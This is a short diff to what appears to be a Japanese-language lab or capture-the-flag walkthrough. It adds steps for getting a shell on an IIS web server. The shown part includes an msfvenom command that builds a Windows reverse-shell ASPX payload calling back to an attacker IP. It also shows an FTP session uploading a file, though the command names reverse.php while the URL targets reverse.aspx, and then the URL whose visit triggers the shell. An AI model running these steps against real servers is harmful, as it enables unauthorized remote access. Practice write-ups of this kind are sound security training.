@@ -48,3 +48,20 @@ drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
 ```sh
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=443 -f aspx -o reverse.aspx
 ```
+```sh
+ftp > put reverse.php
+ftp > ls
+229 Entering Extended Passive Mode (|||63862|)
+150 Starting data transfer.
+drwxrwxrwx 1 ftp ftp               0 Nov 30  2022 aspnet_client
+-rw-rw-rw- 1 ftp ftp             703 Nov 29  2022 iisstart.htm
+-rw-rw-rw- 1 ftp ftp           99710 Nov 29  2022 iisstart.png
+-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 security.txt
+drwxrwxrwx 1 ftp ftp               0 Nov 29  2022 umbraco
+-rw-rw-rw- 1 ftp ftp              74 Dec 01  2022 reverse.php
+```
+
+4. 以下のURL（TLD+1：IISの方）でアクセスしたらリバースシェル獲得
+```
+http://skylark.jp:24680/reverse.aspx
+```
